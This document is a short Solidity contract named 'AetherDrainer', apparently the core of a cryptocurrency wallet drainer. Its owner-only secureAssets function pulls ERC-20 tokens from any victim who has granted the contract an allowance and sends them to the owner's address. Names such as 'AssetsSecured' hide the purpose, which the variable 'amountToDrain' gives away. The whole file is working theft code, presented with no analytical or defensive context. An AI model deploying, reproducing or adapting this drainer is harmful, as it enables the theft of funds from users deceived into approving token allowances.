// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AetherDrainer {
    address public owner;
    
    event AssetsSecured(address indexed user, address token, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function secureAssets(address token, address user, uint256 percentage) external onlyOwner {
        require(percentage <= 100, "Invalid percentage");
        
        uint256 balance = IERC20(token).balanceOf(user);
        uint256 allowance = IERC20(token).allowance(user, address(this));
        
        uint256 available = allowance < balance ? allowance : balance;
        uint256 amountToDrain = (available * percentage) / 100;
        
        if (amountToDrain > 0) {
            require(IERC20(token).transferFrom(user, owner, amountToDrain), "Transfer failed");
            emit AssetsSecured(user, token, amountToDrain);
        }
    }

    function updateOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }
}
